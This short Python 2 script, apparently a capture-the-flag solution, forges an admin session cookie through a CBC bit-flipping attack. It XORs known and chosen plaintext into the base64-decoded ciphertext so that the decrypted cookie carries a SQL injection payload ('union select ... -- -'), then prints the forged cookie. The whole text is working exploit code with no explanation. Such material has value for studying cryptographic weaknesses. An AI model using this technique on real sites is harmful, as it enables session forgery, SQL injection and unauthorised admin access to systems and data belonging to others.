org_plaintext   = 'yyyyyyyyyyyyyyyyyyyyyyyyyyyyyy|thisisareallyreallylongstringasfalsfassfasfaasff_'
admin_plaintext = "yyyyyyyyyyyyyyyy' union select 'hisisareallyreal',1-- -tringasfalsfassfasfaasff_"

org_cipher = base64.b64decode(urllib.unquote('NGavsbCl2edw1Do6YfQS729nAN4G%2B2ylXChxfV7PhqdWQDPLQDOAW3gWmYm7LXHz7tNZ7gFRjkVvonxtMRpDALvYPXMBeCu%2BZ9332%2BcNY3M%3D'))
admin_cipher = map(ord, org_cipher)

for i in xrange(0, 16):
    admin_cipher[i] = ord(org_cipher[i]) ^ ord(org_plaintext[i + 16]) ^ ord(admin_plaintext[i + 16])

for i in xrange(32, 48):
    admin_cipher[i] = ord(org_cipher[i]) ^ ord(org_plaintext[i + 16]) ^ ord(admin_plaintext[i + 16])

admin_cipher = ''.join(map(chr, admin_cipher))
print 'Admin Cookie:', urllib.quote(base64.b64encode(admin_cipher))
